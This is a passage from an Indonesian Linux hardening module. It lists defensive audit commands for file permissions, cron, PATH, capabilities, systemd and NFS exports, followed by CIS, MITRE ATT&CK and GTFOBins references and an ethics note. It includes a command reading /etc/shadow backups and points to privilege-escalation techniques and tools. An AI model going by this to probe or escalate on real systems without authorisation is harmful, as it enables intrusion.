                      /etc/passwd- /etc/shadow- 2>/dev/null

# === World-writable & unowned === (harapkan kosong / hanya sticky-dir yang wajar)
find / -xdev -type f -perm -0002 2>/dev/null
find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null
find / -xdev \( -nouser -o -nogroup \) 2>/dev/null

# === umask === (harapkan 027 atau lebih ketat)
grep -E '^\s*UMASK' /etc/login.defs

# === Cron permission === (crontab 600; direktori cron 700; owner root)
stat -c '%n %a %U:%G' /etc/crontab /etc/cron.d \
     /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
ls -l /etc/cron.allow /etc/at.allow 2>/dev/null   # harapkan ada (allow-list)
ls -l /etc/cron.deny  /etc/at.deny  2>/dev/null   # harapkan TIDAK ada

# === PATH === (harapkan tak ada '.', elemen kosong, atau dir world-writable)
echo "$PATH"
echo "$PATH" | tr ':' '\n' | while read d; do
  [ -d "$d" ] && find "$d" -maxdepth 0 -perm -0002 2>/dev/null
done

# === Capabilities === (harapkan hanya binary yang dirancang; interpreter bersih)
getcap -r / 2>/dev/null

# === Systemd unit/ExecStart writable === (harapkan kosong = tak ada unit/target ditulis non-root)
find /etc/systemd/system /run/systemd/system /lib/systemd/system -maxdepth 2 -perm -0002 -type f 2>/dev/null

# === NFS exports === (harapkan TIDAK ada no_root_squash; ekspor di-scope subnet, default ro)
exportfs -v 2>/dev/null
grep -vE '^\s*#|^\s*$' /etc/exports /etc/exports.d/*.exports 2>/dev/null | grep -i no_root_squash   # harapkan kosong
```

> Catatan: `getcap`/`setcap` butuh paket **libcap2-bin** (Ubuntu/Debian) atau **libcap** (RHEL/Rocky). `find`, `stat`, `grep`, `tr` tersedia default. Tool enumerasi otomatis seperti **LinPEAS**, **linux-smart-enumeration (lse.sh)**, atau **pspy** (memantau cron/proses tanpa root) berguna untuk validasi cepat di lab.

---

## Referensi

- **CIS Benchmarks** — *CIS Ubuntu Linux 22.04/24.04 LTS Benchmark* & *CIS Red Hat Enterprise Linux 9 Benchmark*: §1 Filesystem (`nosuid`/`nodev`/`noexec`, sticky), §5.1 Cron/at, §6.1 System File Permissions (passwd/shadow/gshadow), *Ensure NFS exports do not use `no_root_squash`* / *Ensure NFS is not installed unless required*, audit SUID/SGID & world-writable.
- **MITRE ATT&CK:** T1548.001 (Setuid/Setgid), T1548.003 (Sudo & Sudo Caching), T1053.003 (Scheduled Task: Cron), T1053.006 (Systemd Timer), T1543.002 (Systemd Service), T1059.004 (Unix Shell), T1080 (Taint Shared Content — NFS), T1574.007 (Path Interception by PATH Env Var), T1222.002 (Linux File & Dir Perms Mod), T1003.008 (OS Cred Dumping: /etc/passwd & /etc/shadow), T1068 (Exploitation for Privilege Escalation).
- **GTFOBins** (`gtfobins.github.io`) — daftar binary Unix yang bisa disalahgunakan via SUID, sudo, dan capabilities (termasuk `tar`/`rsync`/`chown` untuk wildcard/argument injection).
- **man pages:** `capabilities(7)`, `setcap(8)`, `getcap(8)`, `find(1)`, `crontab(5)`, `tar(1)` (`--checkpoint`/`--checkpoint-action`), `systemd.unit(5)`, `systemd.timer(5)`, `exports(5)`, `exportfs(8)`, `showmount(8)`, `umask(2)`, `chmod(1)`.
- **CVE acuan:** CVE-2021-4034 (PwnKit/`pkexec`, SUID), CVE-2021-3156 (Baron Samedit, sudo — lihat Modul 01).
- **Lintas modul:** [`01-privileged-access-management-pam.md`](01-privileged-access-management-pam.md) (sudo/PAM/polkit), [`02-dangerous-exposed-services.md`](02-dangerous-exposed-services.md), [`04-network-service-security.md`](04-network-service-security.md), [`05-logging.md`](05-logging.md) (auditd, rule privileged-exec). Padanan Windows: [`../windows/01-privileged-access-management.md`](../windows/01-privileged-access-management.md).

---

> **Catatan etika.** Seluruh teknik eskalasi di modul ini ditujukan untuk **memahami dan menutup** celah pada sistem milik sendiri, lab terisolasi, atau lingkungan CTF/LKS resmi tempat Anda diberi izin tertulis. Mengeksploitasi sistem tanpa otorisasi adalah pelanggaran hukum. Gunakan hanya untuk pembelajaran dan pertahanan.
